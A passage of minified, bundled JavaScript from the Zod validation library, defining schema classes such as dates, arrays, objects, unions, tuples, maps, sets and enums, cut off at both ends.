                        code: yi.invalid_type,
                        expected: gi.date,
                        received: t.parsedType
                    }), Ci
                }
                if (isNaN(e.data.getTime())) {
                    return Ei(this._getOrReturnCtx(e), {
                        code: yi.invalid_date
                    }), Ci
                }
                const t = new Si;
                let n;
                for (const r of this._def.checks) "min" === r.kind ? e.data.getTime() < r.value && (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.too_small,
                    message: r.message,
                    inclusive: !0,
                    exact: !1,
                    minimum: r.value,
                    type: "date"
                }), t.dirty()) : "max" === r.kind ? e.data.getTime() > r.value && (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.too_big,
                    message: r.message,
                    inclusive: !0,
                    exact: !1,
                    maximum: r.value,
                    type: "date"
                }), t.dirty()) : pi.assertNever(r);
                return {
                    status: t.value,
                    value: new Date(e.data.getTime())
                }
            }
            _addCheck(e) {
                return new Xi({ ...this._def,
                    checks: [...this._def.checks, e]
                })
            }
            min(e, t) {
                return this._addCheck({
                    kind: "min",
                    value: e.getTime(),
                    message: Oi.toString(t)
                })
            }
            max(e, t) {
                return this._addCheck({
                    kind: "max",
                    value: e.getTime(),
                    message: Oi.toString(t)
                })
            }
            get minDate() {
                let e = null;
                for (const t of this._def.checks) "min" === t.kind && (null === e || t.value > e) && (e = t.value);
                return null != e ? new Date(e) : null
            }
            get maxDate() {
                let e = null;
                for (const t of this._def.checks) "max" === t.kind && (null === e || t.value < e) && (e = t.value);
                return null != e ? new Date(e) : null
            }
        }
        Xi.create = e => new Xi({
            checks: [],
            coerce: (null === e || void 0 === e ? void 0 : e.coerce) || !1,
            typeName: Lo.ZodDate,
            ...ji(e)
        });
        class $i extends Fi {
            _parse(e) {
                if (this._getType(e) !== gi.symbol) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.symbol,
                        received: t.parsedType
                    }), Ci
                }
                return Ii(e.data)
            }
        }
        $i.create = e => new $i({
            typeName: Lo.ZodSymbol,
            ...ji(e)
        });
        class eo extends Fi {
            _parse(e) {
                if (this._getType(e) !== gi.undefined) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.undefined,
                        received: t.parsedType
                    }), Ci
                }
                return Ii(e.data)
            }
        }
        eo.create = e => new eo({
            typeName: Lo.ZodUndefined,
            ...ji(e)
        });
        class to extends Fi {
            _parse(e) {
                if (this._getType(e) !== gi.null) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.null,
                        received: t.parsedType
                    }), Ci
                }
                return Ii(e.data)
            }
        }
        to.create = e => new to({
            typeName: Lo.ZodNull,
            ...ji(e)
        });
        class no extends Fi {
            constructor() {
                super(...arguments), this._any = !0
            }
            _parse(e) {
                return Ii(e.data)
            }
        }
        no.create = e => new no({
            typeName: Lo.ZodAny,
            ...ji(e)
        });
        class ro extends Fi {
            constructor() {
                super(...arguments), this._unknown = !0
            }
            _parse(e) {
                return Ii(e.data)
            }
        }
        ro.create = e => new ro({
            typeName: Lo.ZodUnknown,
            ...ji(e)
        });
        class io extends Fi {
            _parse(e) {
                const t = this._getOrReturnCtx(e);
                return Ei(t, {
                    code: yi.invalid_type,
                    expected: gi.never,
                    received: t.parsedType
                }), Ci
            }
        }
        io.create = e => new io({
            typeName: Lo.ZodNever,
            ...ji(e)
        });
        class oo extends Fi {
            _parse(e) {
                if (this._getType(e) !== gi.undefined) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.void,
                        received: t.parsedType
                    }), Ci
                }
                return Ii(e.data)
            }
        }
        oo.create = e => new oo({
            typeName: Lo.ZodVoid,
            ...ji(e)
        });
        class ao extends Fi {
            _parse(e) {
                const {
                    ctx: t,
                    status: n
                } = this._processInputParams(e), r = this._def;
                if (t.parsedType !== gi.array) return Ei(t, {
                    code: yi.invalid_type,
                    expected: gi.array,
                    received: t.parsedType
                }), Ci;
                if (null !== r.exactLength) {
                    const e = t.data.length > r.exactLength.value,
                        i = t.data.length < r.exactLength.value;
                    (e || i) && (Ei(t, {
                        code: e ? yi.too_big : yi.too_small,
                        minimum: i ? r.exactLength.value : void 0,
                        maximum: e ? r.exactLength.value : void 0,
                        type: "array",
                        inclusive: !0,
                        exact: !0,
                        message: r.exactLength.message
                    }), n.dirty())
                }
                if (null !== r.minLength && t.data.length < r.minLength.value && (Ei(t, {
                        code: yi.too_small,
                        minimum: r.minLength.value,
                        type: "array",
                        inclusive: !0,
                        exact: !1,
                        message: r.minLength.message
                    }), n.dirty()), null !== r.maxLength && t.data.length > r.maxLength.value && (Ei(t, {
                        code: yi.too_big,
                        maximum: r.maxLength.value,
                        type: "array",
                        inclusive: !0,
                        exact: !1,
                        message: r.maxLength.message
                    }), n.dirty()), t.common.async) return Promise.all([...t.data].map(((e, n) => r.type._parseAsync(new Ri(t, e, t.path, n))))).then((e => Si.mergeArray(n, e)));
                const i = [...t.data].map(((e, n) => r.type._parseSync(new Ri(t, e, t.path, n))));
                return Si.mergeArray(n, i)
            }
            get element() {
                return this._def.type
            }
            min(e, t) {
                return new ao({ ...this._def,
                    minLength: {
                        value: e,
                        message: Oi.toString(t)
                    }
                })
            }
            max(e, t) {
                return new ao({ ...this._def,
                    maxLength: {
                        value: e,
                        message: Oi.toString(t)
                    }
                })
            }
            length(e, t) {
                return new ao({ ...this._def,
                    exactLength: {
                        value: e,
                        message: Oi.toString(t)
                    }
                })
            }
            nonempty(e) {
                return this.min(1, e)
            }
        }

        function so(e) {
            if (e instanceof co) {
                const t = {};
                for (const n in e.shape) {
                    const r = e.shape[n];
                    t[n] = _o.create(so(r))
                }
                return new co({ ...e._def,
                    shape: () => t
                })
            }
            return e instanceof ao ? new ao({ ...e._def,
                type: so(e.element)
            }) : e instanceof _o ? _o.create(so(e.unwrap())) : e instanceof Io ? Io.create(so(e.unwrap())) : e instanceof mo ? mo.create(e.items.map((e => so(e)))) : e
        }
        ao.create = (e, t) => new ao({
            type: e,
            minLength: null,
            maxLength: null,
            exactLength: null,
            typeName: Lo.ZodArray,
            ...ji(t)
        });
        class co extends Fi {
            constructor() {
                super(...arguments), this._cached = null, this.nonstrict = this.passthrough, this.augment = this.extend
            }
            _getCached() {
                if (null !== this._cached) return this._cached;
                const e = this._def.shape(),
                    t = pi.objectKeys(e);
                return this._cached = {
                    shape: e,
                    keys: t
                }
            }
            _parse(e) {
                if (this._getType(e) !== gi.object) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.object,
                        received: t.parsedType
                    }), Ci
                }
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e), {
                    shape: r,
                    keys: i
                } = this._getCached(), o = [];
                if (!(this._def.catchall instanceof io && "strip" === this._def.unknownKeys))
                    for (const s in n.data) i.includes(s) || o.push(s);
                const a = [];
                for (const s of i) {
                    const e = r[s],
                        t = n.data[s];
                    a.push({
                        key: {
                            status: "valid",
                            value: s
                        },
                        value: e._parse(new Ri(n, t, n.path, s)),
                        alwaysSet: s in n.data
                    })
                }
                if (this._def.catchall instanceof io) {
                    const e = this._def.unknownKeys;
                    if ("passthrough" === e)
                        for (const t of o) a.push({
                            key: {
                                status: "valid",
                                value: t
                            },
                            value: {
                                status: "valid",
                                value: n.data[t]
                            }
                        });
                    else if ("strict" === e) o.length > 0 && (Ei(n, {
                        code: yi.unrecognized_keys,
                        keys: o
                    }), t.dirty());
                    else if ("strip" !== e) throw new Error("Internal ZodObject error: invalid unknownKeys value.")
                } else {
                    const e = this._def.catchall;
                    for (const t of o) {
                        const r = n.data[t];
                        a.push({
                            key: {
                                status: "valid",
                                value: t
                            },
                            value: e._parse(new Ri(n, r, n.path, t)),
                            alwaysSet: t in n.data
                        })
                    }
                }
                return n.common.async ? Promise.resolve().then((async () => {
                    const e = [];
                    for (const t of a) {
                        const n = await t.key;
                        e.push({
                            key: n,
                            value: await t.value,
                            alwaysSet: t.alwaysSet
                        })
                    }
                    return e
                })).then((e => Si.mergeObjectSync(t, e))) : Si.mergeObjectSync(t, a)
            }
            get shape() {
                return this._def.shape()
            }
            strict(e) {
                return Oi.errToObj, new co({ ...this._def,
                    unknownKeys: "strict",
                    ...void 0 !== e ? {
                        errorMap: (t, n) => {
                            var r, i, o, a;
                            const s = null !== (o = null === (i = (r = this._def).errorMap) || void 0 === i ? void 0 : i.call(r, t, n).message) && void 0 !== o ? o : n.defaultError;
                            return "unrecognized_keys" === t.code ? {
                                message: null !== (a = Oi.errToObj(e).message) && void 0 !== a ? a : s
                            } : {
                                message: s
                            }
                        }
                    } : {}
                })
            }
            strip() {
                return new co({ ...this._def,
                    unknownKeys: "strip"
                })
            }
            passthrough() {
                return new co({ ...this._def,
                    unknownKeys: "passthrough"
                })
            }
            extend(e) {
                return new co({ ...this._def,
                    shape: () => ({ ...this._def.shape(),
                        ...e
                    })
                })
            }
            merge(e) {
                return new co({
                    unknownKeys: e._def.unknownKeys,
                    catchall: e._def.catchall,
                    shape: () => ({ ...this._def.shape(),
                        ...e._def.shape()
                    }),
                    typeName: Lo.ZodObject
                })
            }
            setKey(e, t) {
                return this.augment({
                    [e]: t
                })
            }
            catchall(e) {
                return new co({ ...this._def,
                    catchall: e
                })
            }
            pick(e) {
                const t = {};
                return pi.objectKeys(e).forEach((n => {
                    e[n] && this.shape[n] && (t[n] = this.shape[n])
                })), new co({ ...this._def,
                    shape: () => t
                })
            }
            omit(e) {
                const t = {};
                return pi.objectKeys(this.shape).forEach((n => {
                    e[n] || (t[n] = this.shape[n])
                })), new co({ ...this._def,
                    shape: () => t
                })
            }
            deepPartial() {
                return so(this)
            }
            partial(e) {
                const t = {};
                return pi.objectKeys(this.shape).forEach((n => {
                    const r = this.shape[n];
                    e && !e[n] ? t[n] = r : t[n] = r.optional()
                })), new co({ ...this._def,
                    shape: () => t
                })
            }
            required(e) {
                const t = {};
                return pi.objectKeys(this.shape).forEach((n => {
                    if (e && !e[n]) t[n] = this.shape[n];
                    else {
                        let e = this.shape[n];
                        for (; e instanceof _o;) e = e._def.innerType;
                        t[n] = e
                    }
                })), new co({ ...this._def,
                    shape: () => t
                })
            }
            keyof() {
                return Ao(pi.objectKeys(this.shape))
            }
        }
        co.create = (e, t) => new co({
            shape: () => e,
            unknownKeys: "strip",
            catchall: io.create(),
            typeName: Lo.ZodObject,
            ...ji(t)
        }), co.strictCreate = (e, t) => new co({
            shape: () => e,
            unknownKeys: "strict",
            catchall: io.create(),
            typeName: Lo.ZodObject,
            ...ji(t)
        }), co.lazycreate = (e, t) => new co({
            shape: e,
            unknownKeys: "strip",
            catchall: io.create(),
            typeName: Lo.ZodObject,
            ...ji(t)
        });
        class lo extends Fi {
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e), n = this._def.options;
                if (t.common.async) return Promise.all(n.map((async e => {
                    const n = { ...t,
                        common: { ...t.common,
                            issues: []
                        },
                        parent: null
                    };
                    return {
                        result: await e._parseAsync({
                            data: t.data,
                            path: t.path,
                            parent: n
                        }),
                        ctx: n
                    }
                }))).then((function(e) {
                    for (const t of e)
                        if ("valid" === t.result.status) return t.result;
                    for (const r of e)
                        if ("dirty" === r.result.status) return t.common.issues.push(...r.ctx.common.issues), r.result;
                    const n = e.map((e => new bi(e.ctx.common.issues)));
                    return Ei(t, {
                        code: yi.invalid_union,
                        unionErrors: n
                    }), Ci
                })); {
                    let e;
                    const r = [];
                    for (const o of n) {
                        const n = { ...t,
                                common: { ...t.common,
                                    issues: []
                                },
                                parent: null
                            },
                            i = o._parseSync({
                                data: t.data,
                                path: t.path,
                                parent: n
                            });
                        if ("valid" === i.status) return i;
                        "dirty" !== i.status || e || (e = {
                            result: i,
                            ctx: n
                        }), n.common.issues.length && r.push(n.common.issues)
                    }
                    if (e) return t.common.issues.push(...e.ctx.common.issues), e.result;
                    const i = r.map((e => new bi(e)));
                    return Ei(t, {
                        code: yi.invalid_union,
                        unionErrors: i
                    }), Ci
                }
            }
            get options() {
                return this._def.options
            }
        }
        lo.create = (e, t) => new lo({
            options: e,
            typeName: Lo.ZodUnion,
            ...ji(t)
        });
        const uo = e => e instanceof wo ? uo(e.schema) : e instanceof Co ? uo(e.innerType()) : e instanceof xo ? [e.value] : e instanceof ko ? e.options : e instanceof Eo ? Object.keys(e.enum) : e instanceof Po ? uo(e._def.innerType) : e instanceof eo ? [void 0] : e instanceof to ? [null] : null;
        class fo extends Fi {
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e);
                if (t.parsedType !== gi.object) return Ei(t, {
                    code: yi.invalid_type,
                    expected: gi.object,
                    received: t.parsedType
                }), Ci;
                const n = this.discriminator,
                    r = t.data[n],
                    i = this.optionsMap.get(r);
                return i ? t.common.async ? i._parseAsync({
                    data: t.data,
                    path: t.path,
                    parent: t
                }) : i._parseSync({
                    data: t.data,
                    path: t.path,
                    parent: t
                }) : (Ei(t, {
                    code: yi.invalid_union_discriminator,
                    options: Array.from(this.optionsMap.keys()),
                    path: [n]
                }), Ci)
            }
            get discriminator() {
                return this._def.discriminator
            }
            get options() {
                return this._def.options
            }
            get optionsMap() {
                return this._def.optionsMap
            }
            static create(e, t, n) {
                const r = new Map;
                for (const i of t) {
                    const t = uo(i.shape[e]);
                    if (!t) throw new Error("A discriminator value for key `".concat(e, "` could not be extracted from all schema options"));
                    for (const n of t) {
                        if (r.has(n)) throw new Error("Discriminator property ".concat(String(e), " has duplicate value ").concat(String(n)));
                        r.set(n, i)
                    }
                }
                return new fo({
                    typeName: Lo.ZodDiscriminatedUnion,
                    discriminator: e,
                    options: t,
                    optionsMap: r,
                    ...ji(n)
                })
            }
        }

        function ho(e, t) {
            const n = vi(e),
                r = vi(t);
            if (e === t) return {
                valid: !0,
                data: e
            };
            if (n === gi.object && r === gi.object) {
                const n = pi.objectKeys(t),
                    r = pi.objectKeys(e).filter((e => -1 !== n.indexOf(e))),
                    i = { ...e,
                        ...t
                    };
                for (const o of r) {
                    const n = ho(e[o], t[o]);
                    if (!n.valid) return {
                        valid: !1
                    };
                    i[o] = n.data
                }
                return {
                    valid: !0,
                    data: i
                }
            }
            if (n === gi.array && r === gi.array) {
                if (e.length !== t.length) return {
                    valid: !1
                };
                const n = [];
                for (let r = 0; r < e.length; r++) {
                    const i = ho(e[r], t[r]);
                    if (!i.valid) return {
                        valid: !1
                    };
                    n.push(i.data)
                }
                return {
                    valid: !0,
                    data: n
                }
            }
            return n === gi.date && r === gi.date && +e === +t ? {
                valid: !0,
                data: e
            } : {
                valid: !1
            }
        }
        class po extends Fi {
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e), r = (e, r) => {
                    if (Pi(e) || Pi(r)) return Ci;
                    const i = ho(e.value, r.value);
                    return i.valid ? ((Ti(e) || Ti(r)) && t.dirty(), {
                        status: t.value,
                        value: i.data
                    }) : (Ei(n, {
                        code: yi.invalid_intersection_types
                    }), Ci)
                };
                return n.common.async ? Promise.all([this._def.left._parseAsync({
                    data: n.data,
                    path: n.path,
                    parent: n
                }), this._def.right._parseAsync({
                    data: n.data,
                    path: n.path,
                    parent: n
                })]).then((e => {
                    let [t, n] = e;
                    return r(t, n)
                })) : r(this._def.left._parseSync({
                    data: n.data,
                    path: n.path,
                    parent: n
                }), this._def.right._parseSync({
                    data: n.data,
                    path: n.path,
                    parent: n
                }))
            }
        }
        po.create = (e, t, n) => new po({
            left: e,
            right: t,
            typeName: Lo.ZodIntersection,
            ...ji(n)
        });
        class mo extends Fi {
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e);
                if (n.parsedType !== gi.array) return Ei(n, {
                    code: yi.invalid_type,
                    expected: gi.array,
                    received: n.parsedType
                }), Ci;
                if (n.data.length < this._def.items.length) return Ei(n, {
                    code: yi.too_small,
                    minimum: this._def.items.length,
                    inclusive: !0,
                    exact: !1,
                    type: "array"
                }), Ci;
                !this._def.rest && n.data.length > this._def.items.length && (Ei(n, {
                    code: yi.too_big,
                    maximum: this._def.items.length,
                    inclusive: !0,
                    exact: !1,
                    type: "array"
                }), t.dirty());
                const r = [...n.data].map(((e, t) => {
                    const r = this._def.items[t] || this._def.rest;
                    return r ? r._parse(new Ri(n, e, n.path, t)) : null
                })).filter((e => !!e));
                return n.common.async ? Promise.all(r).then((e => Si.mergeArray(t, e))) : Si.mergeArray(t, r)
            }
            get items() {
                return this._def.items
            }
            rest(e) {
                return new mo({ ...this._def,
                    rest: e
                })
            }
        }
        mo.create = (e, t) => {
            if (!Array.isArray(e)) throw new Error("You must pass an array of schemas to z.tuple([ ... ])");
            return new mo({
                items: e,
                typeName: Lo.ZodTuple,
                rest: null,
                ...ji(t)
            })
        };
        class go extends Fi {
            get keySchema() {
                return this._def.keyType
            }
            get valueSchema() {
                return this._def.valueType
            }
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e);
                if (n.parsedType !== gi.object) return Ei(n, {
                    code: yi.invalid_type,
                    expected: gi.object,
                    received: n.parsedType
                }), Ci;
                const r = [],
                    i = this._def.keyType,
                    o = this._def.valueType;
                for (const a in n.data) r.push({
                    key: i._parse(new Ri(n, a, n.path, a)),
                    value: o._parse(new Ri(n, n.data[a], n.path, a))
                });
                return n.common.async ? Si.mergeObjectAsync(t, r) : Si.mergeObjectSync(t, r)
            }
            get element() {
                return this._def.valueType
            }
            static create(e, t, n) {
                return new go(t instanceof Fi ? {
                    keyType: e,
                    valueType: t,
                    typeName: Lo.ZodRecord,
                    ...ji(n)
                } : {
                    keyType: Vi.create(),
                    valueType: e,
                    typeName: Lo.ZodRecord,
                    ...ji(t)
                })
            }
        }
        class vo extends Fi {
            get keySchema() {
                return this._def.keyType
            }
            get valueSchema() {
                return this._def.valueType
            }
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e);
                if (n.parsedType !== gi.map) return Ei(n, {
                    code: yi.invalid_type,
                    expected: gi.map,
                    received: n.parsedType
                }), Ci;
                const r = this._def.keyType,
                    i = this._def.valueType,
                    o = [...n.data.entries()].map(((e, t) => {
                        let [o, a] = e;
                        return {
                            key: r._parse(new Ri(n, o, n.path, [t, "key"])),
                            value: i._parse(new Ri(n, a, n.path, [t, "value"]))
                        }
                    }));
                if (n.common.async) {
                    const e = new Map;
                    return Promise.resolve().then((async () => {
                        for (const n of o) {
                            const r = await n.key,
                                i = await n.value;
                            if ("aborted" === r.status || "aborted" === i.status) return Ci;
                            "dirty" !== r.status && "dirty" !== i.status || t.dirty(), e.set(r.value, i.value)
                        }
                        return {
                            status: t.value,
                            value: e
                        }
                    }))
                } {
                    const e = new Map;
                    for (const n of o) {
                        const r = n.key,
                            i = n.value;
                        if ("aborted" === r.status || "aborted" === i.status) return Ci;
                        "dirty" !== r.status && "dirty" !== i.status || t.dirty(), e.set(r.value, i.value)
                    }
                    return {
                        status: t.value,
                        value: e
                    }
                }
            }
        }
        vo.create = (e, t, n) => new vo({
            valueType: t,
            keyType: e,
            typeName: Lo.ZodMap,
            ...ji(n)
        });
        class yo extends Fi {
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e);
                if (n.parsedType !== gi.set) return Ei(n, {
                    code: yi.invalid_type,
                    expected: gi.set,
                    received: n.parsedType
                }), Ci;
                const r = this._def;
                null !== r.minSize && n.data.size < r.minSize.value && (Ei(n, {
                    code: yi.too_small,
                    minimum: r.minSize.value,
                    type: "set",
                    inclusive: !0,
                    exact: !1,
                    message: r.minSize.message
                }), t.dirty()), null !== r.maxSize && n.data.size > r.maxSize.value && (Ei(n, {
                    code: yi.too_big,
                    maximum: r.maxSize.value,
                    type: "set",
                    inclusive: !0,
                    exact: !1,
                    message: r.maxSize.message
                }), t.dirty());
                const i = this._def.valueType;

                function o(e) {
                    const n = new Set;
                    for (const r of e) {
                        if ("aborted" === r.status) return Ci;
                        "dirty" === r.status && t.dirty(), n.add(r.value)
                    }
                    return {
                        status: t.value,
                        value: n
                    }
                }
                const a = [...n.data.values()].map(((e, t) => i._parse(new Ri(n, e, n.path, t))));
                return n.common.async ? Promise.all(a).then((e => o(e))) : o(a)
            }
            min(e, t) {
                return new yo({ ...this._def,
                    minSize: {
                        value: e,
                        message: Oi.toString(t)
                    }
                })
            }
            max(e, t) {
                return new yo({ ...this._def,
                    maxSize: {
                        value: e,
                        message: Oi.toString(t)
                    }
                })
            }
            size(e, t) {
                return this.min(e, t).max(e, t)
            }
            nonempty(e) {
                return this.min(1, e)
            }
        }
        yo.create = (e, t) => new yo({
            valueType: e,
            minSize: null,
            maxSize: null,
            typeName: Lo.ZodSet,
            ...ji(t)
        });
        class bo extends Fi {
            constructor() {
                super(...arguments), this.validate = this.implement
            }
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e);
                if (t.parsedType !== gi.function) return Ei(t, {
                    code: yi.invalid_type,
                    expected: gi.function,
                    received: t.parsedType
                }), Ci;

                function n(e, n) {
                    return ki({
                        data: e,
                        path: t.path,
                        errorMaps: [t.common.contextualErrorMap, t.schemaErrorMap, Ai(), wi].filter((e => !!e)),
                        issueData: {
                            code: yi.invalid_arguments,
                            argumentsError: n
                        }
                    })
                }

                function r(e, n) {
                    return ki({
                        data: e,
                        path: t.path,
                        errorMaps: [t.common.contextualErrorMap, t.schemaErrorMap, Ai(), wi].filter((e => !!e)),
                        issueData: {
                            code: yi.invalid_return_type,
                            returnTypeError: n
                        }
                    })
                }
                const i = {
                        errorMap: t.common.contextualErrorMap
                    },
                    o = t.data;
                if (this._def.returns instanceof So) {
                    const e = this;
                    return Ii((async function() {
                        for (var t = arguments.length, a = new Array(t), s = 0; s < t; s++) a[s] = arguments[s];
                        const c = new bi([]),
                            l = await e._def.args.parseAsync(a, i).catch((e => {
                                throw c.addIssue(n(a, e)), c
                            })),
                            u = await Reflect.apply(o, this, l);
                        return await e._def.returns._def.type.parseAsync(u, i).catch((e => {
                            throw c.addIssue(r(u, e)), c
                        }))
                    }))
                } {
                    const e = this;
                    return Ii((function() {
                        for (var t = arguments.length, a = new Array(t), s = 0; s < t; s++) a[s] = arguments[s];
                        const c = e._def.args.safeParse(a, i);
                        if (!c.success) throw new bi([n(a, c.error)]);
                        const l = Reflect.apply(o, this, c.data),
                            u = e._def.returns.safeParse(l, i);
                        if (!u.success) throw new bi([r(l, u.error)]);
                        return u.data
                    }))
                }
            }
            parameters() {
                return this._def.args
            }
            returnType() {
                return this._def.returns
            }
            args() {
                for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                return new bo({ ...this._def,
                    args: mo.create(t).rest(ro.create())
                })
            }
            returns(e) {
                return new bo({ ...this._def,
                    returns: e
                })
            }
            implement(e) {
                return this.parse(e)
            }
            strictImplement(e) {
                return this.parse(e)
            }
            static create(e, t, n) {
                return new bo({
                    args: e || mo.create([]).rest(ro.create()),
                    returns: t || ro.create(),
                    typeName: Lo.ZodFunction,
                    ...ji(n)
                })
            }
        }
        class wo extends Fi {
            get schema() {
                return this._def.getter()
            }
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e);
                return this._def.getter()._parse({
                    data: t.data,
                    path: t.path,
                    parent: t
                })
            }
        }
        wo.create = (e, t) => new wo({
            getter: e,
            typeName: Lo.ZodLazy,
            ...ji(t)
        });
        class xo extends Fi {
            _parse(e) {
                if (e.data !== this._def.value) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        received: t.data,
                        code: yi.invalid_literal,
                        expected: this._def.value
                    }), Ci
                }
                return {
                    status: "valid",
                    value: e.data
                }
            }
            get value() {
                return this._def.value
            }
        }

        function Ao(e, t) {
            return new ko({
                values: e,
                typeName: Lo.ZodEnum,
                ...ji(t)
            })
        }
        xo.create = (e, t) => new xo({
            value: e,
            typeName: Lo.ZodLiteral,
            ...ji(t)
        });
        class ko extends Fi {
            _parse(e) {
                if ("string" !== typeof e.data) {
                    const t = this._getOrReturnCtx(e),
                        n = this._def.values;
                    return Ei(t, {
                        expected: pi.joinValues(n),
                        received: t.parsedType,
                        code: yi.invalid_type
                    }), Ci
                }
                if (-1 === this._def.values.indexOf(e.data)) {
                    const t = this._getOrReturnCtx(e),
                        n = this._def.values;
                    return Ei(t, {
                        received: t.data,
                        code: yi.invalid_enum_value,
                        options: n
                    }), Ci
                }
                return Ii(e.data)
            }
            get options() {
                return this._def.values
            }
            get enum() {
                const e = {};
                for (const t of this._def.values) e[t] = t;
                return e
            }
            get Values() {
                const e = {};
                for (const t of this._def.values) e[t] = t;
                return e
            }
            get Enum() {
                const e = {};
                for (const t of this._def.values) e[t] = t;
                return e
            }
            extract(e) {
                return ko.create(e)
            }
            exclude(e) {
                return ko.create(this.options.filter((t => !e.includes(t))))
            }
        }
        ko.create = Ao;
        class Eo extends Fi {
            _parse(e) {
                const t = pi.getValidEnumValues(this._def.values),
                    n = this._getOrReturnCtx(e);
                if (n.parsedType !== gi.string && n.parsedType !== gi.number) {
                    const e = pi.objectValues(t);
                    return Ei(n, {
                        expected: pi.joinValues(e),
                        received: n.parsedType,
                        code: yi.invalid_type
                    }), Ci
                }
                if (-1 === t.indexOf(e.data)) {
                    const e = pi.objectValues(t);
                    return Ei(n, {
                        received: n.data,
                        code: yi.invalid_enum_value,
                        options: e
                    }), Ci
                }
                return Ii(e.data)
            }
            get enum() {
                return this._def.values
            }
        }
        Eo.create = (e, t) => new Eo({
            values: e,
            typeName: Lo.ZodNativeEnum,
            ...ji(t)
        });
        class So extends Fi {
            unwrap() {
                return this._def.type
            }
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e);
                if (t.parsedType !== gi.promise && !1 === t.common.async) return Ei(t, {
                    code: yi.invalid_type,
                    expected: gi.promise,
                    received: t.parsedType
                }), Ci;
                const n = t.parsedType === gi.promise ? t.data : Promise.resolve(t.data);
                return Ii(n.then((e => this._def.type.parseAsync(e, {
                    path: t.path,
                    errorMap: t.common.contextualErrorMap
                }))))
            }
        }
        So.create = (e, t) => new So({
            type: e,
            typeName: Lo.ZodPromise,
            ...ji(t)
        });
        class Co extends Fi {
            innerType() {
                return this._def.schema
            }
            sourceType() {
                return this._def.schema._def.typeName === Lo.ZodEffects ? this._def.schema.sourceType() : this._def.schema
            }
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e), r = this._def.effect || null, i = {
                    addIssue: e => {
                        Ei(n, e), e.fatal ? t.abort() : t.dirty()
                    },
                    get path() {
                        return n.path
                    }
                };
                if (i.addIssue = i.addIssue.bind(i), "preprocess" === r.type) {
                    const e = r.transform(n.data, i);
                    return n.common.issues.length ? {
                        status: "dirty",
                        value: n.data
                    } : n.common.async ? Promise.resolve(e).then((e => this._def.schema._parseAsync({
                        data: e,
                        path: n.path,
                        parent: n
                    }))) : this._def.schema._parseSync({
                        data: e,
                        path: n.path,
                        parent: n
                    })
                }
                if ("refinement" === r.type) {
                    const e = e => {
                        const t = r.refinement(e, i);
                        if (n.common.async) return Promise.resolve(t);
                        if (t instanceof Promise) throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");
                        return e
                    };
                    if (!1 === n.common.async) {
                        const r = this._def.schema._parseSync({
                            data: n.data,
                            path: n.path,
                            parent: n
                        });
                        return "aborted" === r.status ? Ci : ("dirty" === r.status && t.dirty(), e(r.value), {
                            status: t.value,
                            value: r.value
                        })
                    }
                    return this._def.schema._parseAsync({
                        data: n.data,
                        path: n.path,
                        parent: n
                    }).then((n => "aborted" === n.status ? Ci : ("dirty" === n.status && t.dirty(), e(n.value).then((() => ({
                        status: t.value,
                        value: n.value
                    }))))))
                }
                if ("transform" === r.type) {
                    if (!1 === n.common.async) {
                        const e = this._def.schema._parseSync({
                            data: n.data,
                            path: n.path,
                            parent: n
                        });
                        if (!Bi(e)) return e;
                        const o = r.transform(e.value, i);
                        if (o instanceof Promise) throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");
                        return {
                            status: t.value,
                            value: o
                        }
                    }
                    return this._def.schema._parseAsync({
                        data: n.data,
                        path: n.path,
                        parent: n
                    }).then((e => Bi(e) ? Promise.resolve(r.transform(e.value, i)).then((e => ({
                        status: t.value,
                        value: e
                    }))) : e))
                }
                pi.assertNever(r)
            }
        }
        Co.create = (e, t, n) => new Co({
            schema: e,
            typeName: Lo.ZodEffects,
            effect: t,
            ...ji(n)
        }), Co.createWithPreprocess = (e, t, n) => new Co({
            schema: t,
            effect: {
                type: "preprocess",
                transform: e
            },
            typeName: Lo.ZodEffects,
            ...ji(n)
        });
        class _o extends Fi {
            _parse(e) {
                return this._getType(e) === gi.undefined ? Ii(void 0) : this._def.innerType._parse(e)
            }
            unwrap() {
                return this._def.innerType
            }
        }
        _o.create = (e, t) => new _o({
            innerType: e,
            typeName: Lo.ZodOptional,
            ...ji(t)
        });
        class Io extends Fi {
            _parse(e) {
                return this._getType(e) === gi.null ? Ii(null) : this._def.innerType._parse(e)
            }
            unwrap() {
                return this._def.innerType
            }
        }
        Io.create = (e, t) => new Io({
            innerType: e,
            typeName: Lo.ZodNullable,
            ...ji(t)
        });
        class Po extends Fi {
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e);
                let n = t.data;
                return t.parsedType === gi.undefined && (n = this._def.defaultValue()), this._def.innerType._parse({
                    data: n,
                    path: t.path,
                    parent: t
                })
            }
            removeDefault() {
                return this._def.innerType
            }
        }
        Po.create = (e, t) => new Po({
            innerType: e,
            typeName: Lo.ZodDefault,
            defaultValue: "function" === typeof t.default ? t.default : () => t.default,
            ...ji(t)
        });
        class To extends Fi {
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e), n = { ...t,
